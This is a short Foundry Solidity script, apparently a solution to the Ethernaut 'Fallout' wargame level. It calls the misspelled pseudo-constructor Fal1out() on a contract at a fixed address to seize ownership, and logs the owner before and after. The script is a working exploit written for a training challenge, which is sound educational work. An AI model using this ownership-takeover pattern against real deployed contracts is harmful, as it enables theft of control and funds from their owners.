// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Fallout} from "../src/Fallout.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FalloutSolution is Script {

    Fallout public falloutContract = Fallout(payable(0xD2AFefD345c3ec3bab658000CB770d6Ed2F297f6));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Before Owner :", falloutContract.owner() );
        falloutContract.Fal1out();
        console.log("After Owner :", falloutContract.owner() );
        vm.stopBroadcast();
    }
}
